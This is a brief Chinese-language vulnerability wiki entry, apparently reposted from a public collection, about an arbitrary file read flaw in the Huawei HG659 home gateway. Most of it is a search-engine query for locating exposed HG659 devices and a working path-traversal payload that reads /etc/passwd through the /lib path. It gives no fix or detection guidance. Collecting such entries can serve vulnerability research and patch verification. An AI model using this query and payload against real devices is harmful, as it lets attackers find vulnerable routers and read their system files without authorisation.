---
title: "Huawei HG659 lib 任意文件读取漏洞"
date: 2026-10-18 09:14:49
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "Huawei-HG659-lib"
tags:
  - "Huawei-HG659-lib"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

Huawei HG659 lib 存在任意文件读取漏洞，攻击者通过漏洞可以读取任意文件

## 漏洞影响

```
Huawei HG659
```

## 网络测绘

```
app="HUAWEI-Home-Gateway-HG659"
```

## 漏洞复现

登录页面如下

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110951141.png)

POC如下

```plain
/lib///....//....//....//....//....//....//....//....//etc//passwd
```

![](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202110951927.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/Huawei-HG659-lib-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
